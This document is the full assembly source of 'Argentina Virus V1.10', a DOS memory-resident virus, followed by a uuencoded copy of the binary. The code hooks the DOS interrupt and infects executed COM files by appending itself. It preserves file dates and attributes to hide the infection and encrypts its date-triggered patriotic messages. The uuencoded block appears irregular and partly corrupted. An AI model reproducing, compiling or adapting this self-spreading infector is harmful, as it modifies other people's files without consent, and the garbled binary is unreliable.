Title     Argentina Virus V1.10 - Escrito por A.f.A

Code      segment

          assume cs:Code;ds:Nothing;es:Nothing
          org 0100h

DOS       equ 21h

Start:    mov ah,0FBh

Mov1      equ this word

          mov bx,0000

Mov2      equ this word

          mov cx,0000
          int DOS

          cld

          push cs
          pop ds
          mov ax,cs
          sub ax,8
          mov es,ax
          mov si,0080h
          mov di,Offset Finish1
          mov cx,0080h
          rep movsb

Mov3      equ this word

          mov si,0000
          add si,0100h
          mov di,Offset Start
          mov cx,(Offset Finish1)-(Offset Start)
          rep movsb

          push es
          mov ax,Offset Virus
          push ax
          retf

Old21Call equ this dword
Old21Ofs  dw ?
Old21Seg  dw ?
Pages     dw ?

Virus:    mov bx,Offset Finish2
          add bx,40h
          mov ax,cs
          mov ss,ax
          mov sp,bx
          add bx,15
          mov cl,4
          shr bx,cl
          mov cs:Pages,bx
          push ds
          pop es
          mov ah,4Ah
          int DOS

          mov ax,3521h
          int DOS
          mov cs:Old21Ofs,bx
          mov cs:Old21Seg,es

          push cs
          pop ds
          mov ax,2521h
          mov dx,Offset RutiResi
          int DOS

          mov ax,cs
          add ax,8
          mov ds:ComLinSeg,cs
          mov ds:FCB1Seg,ax
          mov ds:FCB2Seg,ax

          push ax
          pop ds
          mov es,ds:[002Ch]
          xor di,di
          xor ax,ax
          mov cx,0FFFFh
Buscar:   repnz scasb
          cmp byte ptr es:[di],00
          jz Encontre
          scasb
          jnz Buscar
Encontre: mov dx,di
          add dx,3

          push cs
          push es
          pop ds
          pop es
          mov ax,4B00h
          mov bx,Offset ParaBlock
          pushf
          call cs:[Old21Call]

          mov ah,4Dh
          int DOS

          push ax
          mov ax,cs
          add ax,8
          mov ds,ax
          mov ah,49h
          mov es,ds:[002Ch]
          int DOS
          pop ax

          mov ah,31h
          mov dx,Pages
          int DOS

ParaBlock:
EnvSeg    dw 0
ComLinOfs dw Offset Finish1
ComLinSeg dw ?
FCB1Ofs   dw 005Ch
FCB1Seg   dw ?
FCB2Ofs   dw 006Ch
FCB2Seg   dw ?

PrograCall equ this dword
PrograOfs dw 0100h
PrograSeg dw ?

RutiResi: pushf
          cmp ah,0FBh
          jz InfeCall
          cmp ax,4B00h
          jnz Salir
          jmp ExecCall
Salir:    popf
          jmp cs:[Old21Call]
InfeCall: pop ax
          pop ax
          pop ds
          popf
          mov ds:[0100h],bx
          mov ds:[0102h],cx
          mov cs:PrograSeg,ds
          jmp cs:[PrograCall]

VirusRut: call Encript

          push cs
          pop ds

          mov ah,2Ah
          int DOS

          cmp cx,1993
          jb Cont

          cmp dx,(5*256)+25
          jz May25
          cmp dx,(6*256)+20
          jz Jun20
          cmp dx,(7*256)+9
          jz Jul09
          cmp dx,(8*256)+17
          jz Ago17
          jmp Cont

May25:    mov dx,Offset Men25_5
          jmp Mensajes
Jun20:    mov dx,Offset Men20_6
          jmp Mensajes
Jul09:    mov dx,Offset Men09_7
          jmp Mensajes
Ago17:    mov dx,Offset Men17_8

Mensajes: mov ah,9
          int DOS

          mov dx,Offset MenArg
          mov ah,9
          int DOS

          mov dx,Offset MenKey
          mov ah,9
          int DOS

          mov ah,0
          int 16h

          mov dx,Offset MenLf
          mov ah,9
          int DOS

Cont:     inc ds:EcrptCode
          cmp ds:EcrptCode,90h
          jb Cont

          call Encript

          pop es
          pop ds
          pop di
          pop si
          pop dx
          pop cx
          pop bx
          pop ax
          jmp Salir

Nueva24:  xor al,al
          iret

Encript   proc

          push ax
          push cx
          push si
          push di
          push ds
          push es

          push cs
          push cs
          pop ds
          pop es

          mov si,Offset Men25_5
          mov di,si
          mov cx,(Offset Finish1 - Offset Men25_5)

Looping:  lodsb
          xor al,ds:EcrptCode
          stosb
          loop Looping

          pop es
          pop ds
          pop di
          pop si
          pop cx
          pop ax

          ret

Encript   endp

Old24Ofs  dw ?
Old24Seg  dw ?
Date      dw ?
Time      dw ?
Atribut   dw ?
Handle    dw ?
Archivo   dd ?
EcrptCode db 0

ExecCall: push ax
          push bx
          push cx
          push dx
          push si
          push di
          push ds
          push es

          mov word ptr [Archivo],dx
          mov word ptr [Archivo+2],ds

          cld

          mov di,dx
          xor dl,dl
          cmp byte ptr [di+1],':'
          jnz NoSeDrive
          mov dl,[di]
          and dl,31h
NoSeDrive:
          mov ah,36h
          int DOS

          cmp ax,0FFFFh
          jnz DriveOK

Chau1:    jmp VirusRut

DriveOK:  mul cx
          mul bx
          cmp dx,0
          jnz HayLugar
          cmp ax,(Offset Finish2)-(Offset Start)
          jb Chau1

HayLugar: lds si,[Archivo]
          push ds
          pop es
          push si
          pop di
PasName:  lodsb
          cmp al,'a'
          jb NoMinusc
          cmp al,'z'
          ja NoMinusc
          sub al,20h
NoMinusc: stosb
          cmp byte ptr [di],0
          jne PasName

          push cs
          pop ds
          sub di,3
          mov cx,3
          mov si,Offset ComStr
          repz cmpsb
          jne Chau1

EsCom:    sub di,0Bh
          mov cx,7
          mov si,Offset Command
          repz cmpsb
          je Chau1

          mov ax,3524h
          int DOS
          mov cs:Old24Ofs,bx
          mov cs:Old24Seg,es
          mov ax,2524h
          push cs
          pop ds
          mov dx,Offset Nueva24
          int DOS

          lds dx,[Archivo]
          mov ax,4300h
          int DOS
          jb Chau2
          mov Atribut,CX

          mov ax,4301h
          xor cx,cx
          int DOS
          jb Chau2

          mov ax,3D02h
          int DOS
          jnb OpenOK

Chau2:    jmp Reg24Virus

OpenOK:   mov bx,ax
          mov Handle,ax

          mov ax,5700h
          int DOS
          mov Date,dx
          mov Time,cx

          mov ah,3Fh
          mov cx,2
          push cs
          pop ds
          mov dx,(Offset Mov1)+1
          int DOS

          mov ah,3Fh
          mov cx,2
          push cs
          pop ds
          mov dx,(Offset Mov2)+1
          int DOS
                                
          mov ax,4202h
          xor cx,cx
          xor dx,dx
          int DOS
          jb Chau3

          or dx,dx
          jnz Chau3
          cmp ax, 0FFFDh - (Offset Finish1 - Offset Start)
          ja Chau3
          cmp ax,(Offset Finish1 - Offset Start)
          jae Entra

Chau3:    jmp CierrVirus

Entra:    mov Mov3+1,ax

          mov ax,4202h
          mov cx,0FFFFh
          mov dx,- (Offset Finish1 - Offset CierrVirus)
          int DOS
          jb Chau3

          mov ah,3Fh
          mov cx,(Offset Command - Offset CierrVirus)
          mov dx,Offset Auxili
          int DOS
          jb Chau3

          push cs
          pop es
          mov si,Offset CierrVirus
          mov di,Offset Auxili
          mov cx,(Offset Command - Offset CierrVirus)
          repz cmpsb
          jz Chau3

Infectar: mov ax,4202h
          xor cx,cx
          xor dx,dx
          int DOS
          jb Chau3

          mov ah,40h
          mov cx,(Offset Finish1 - Offset Start)
          mov dx,Offset Start
          int DOS
          jb Chau3

          mov Auxili,0E9h
          mov ax,Mov3+1
          sub ax,3
          mov word ptr ds:Auxili+1,ax

          mov ax,4200h
          xor cx,cx
          xor dx,dx
          int DOS
          jb CierrVirus

          mov ah,40h
          mov cx,3
          mov dx,Offset Auxili
          int DOS

CierrVirus:
          mov ax,5701h
          mov dx,Date
          mov cx,Time
          int DOS

          mov ah,3Eh
          int DOS

          lds dx,[Archivo]
          mov ax,4301h
          mov cx,Atribut
          int DOS

Reg24Virus:
          mov dx,Old24Ofs
          mov ds,Old24Seg
          mov ax,2524h
          int DOS
          jmp VirusRut

Command   db 'COMMAND'
ComStr    db 'COM'
Men25_5   db '25 de Mayo, Aniversario de la Formaci�n del Primer Gobierno Patrio Argentino',10,13,'$'
Men20_6   db '20 de Junio, D�a de la Bandera Argentina',10,13,'$'
Men09_7   db '9 de Julio, D�a de la Declaraci�n de la Independencia Argentina',10,13,'$'
Men17_8   db '17 de Agosto, Aniversario de la Defunci�n del General San Martin',10
          db 13,'$'
MenArg    db 'Argentina Virus V1.10 escrito por AfA - Virus BENIGNO - ENET 35'
          db 10,13,'$'
MenKey    db 'Pulse una tecla para continuar...$'
MenLf     db 10,13,'$'

Finish1   equ this byte

Auxili    db 80 dup (?)

Finish2   equ this byte

Code      ends
          end start

begin 775 arg110.com
MM/N[``"Y``#-(?P.'XS(+0@`CL"^@`"_M@6Y@`#SI+X``('&``&_``&YM@3S
MI`:X.@%0RP```````+L&!H/#0(S(CM"+XX/##[$$T^LNB1XX`1X'M$K-(;@A
M--`$NC`8V`0X?N"$ENMT!S2&,R`4(`(P.SP&CTP&CUP%0'XX&+``S
M_S/`N?__\JXF@#T`=`.N=?6+UX/"`PX&'P>X`$N[RP&<+O\>-`&T3<````;``````!``"<@/S[
M=`X]`$MU`^G'`)TN_RXT`5A8'YV)'@`!B0X"`2Z,'ML!+O\NV0'H=@`.'[0J
MS2&!^65C#``````````````````````!04U%25E<>!BZ)%JT"+HP>
MKP+\B_HRTH!]`3IU!8H5@.(QM#;-(3W__W4#Z2?_]^'WXX/Z`'4%/08%X`CW-(7,#Z=,`B]@NHZL"N`!7S2$NB1:E`BZ)#J<"
MM#^Y`@`.'[H#`<@X+TG4*/4?[=P4]
MM@1S`^MID"ZC(`&X`D*Y__^Z7/[-(7+LM#^Y-`"ZM@7-(7+@#@>^$@2_M@6Y
M-`#SIG31N`)",\DSTLTADNH2`!+0,`H[<%
MN`!",\DSTLTA<@JT0+D#`+JV!HP*X)"7-(>G!_4-/34U!3D1#3TTR-2!D92!-
M87EO+"!!;FEV97)S87)I;R!D92!L82!&;W)M86-IHFX@9&5L(%!R:6UE
